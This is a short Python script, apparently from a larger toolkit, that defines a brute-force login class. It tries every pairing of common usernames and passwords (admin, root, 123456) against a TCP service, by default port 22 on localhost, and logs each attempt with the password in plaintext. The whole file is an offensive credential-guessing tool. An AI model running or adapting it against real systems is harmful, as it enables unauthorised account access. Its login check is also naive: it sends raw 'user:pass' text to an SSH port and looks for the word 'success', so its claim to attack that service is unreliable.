import itertools
import socket
import time
from core.logger import log_event

class BruteForceAttack:
    def __init__(self, target_ip, port, usernames, passwords, delay=0.5):
        self.target_ip = target_ip
        self.port = port
        self.usernames = usernames
        self.passwords = passwords
        self.delay = delay
        self.results = []

    def try_login(self, username, password):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((self.target_ip, self.port))
            payload = f"{username}:{password}\n".encode()
            s.send(payload)
            response = s.recv(1024)
            s.close()
            return b"success" in response.lower()
        except Exception as e:
            return False

    def run(self):
        attempts = itertools.product(self.usernames, self.passwords)
        for username, password in attempts:
            log_event("brute_attempt", {"username": username, "password": password})
            if self.try_login(username, password):
                result = {"username": username, "password": password, "status": "success"}
                log_event("brute_success", result, level="info")
                self.results.append(result)
            else:
                result = {"username": username, "password": password, "status": "fail"}
                log_event("brute_fail", result)
            time.sleep(self.delay)
        return self.results

if __name__ == "__main__":
    usernames = ["admin", "user", "root"]
    passwords = ["123456", "password", "admin123"]
    brute = BruteForceAttack("127.0.0.1", 22, usernames, passwords)
    print(brute.run())
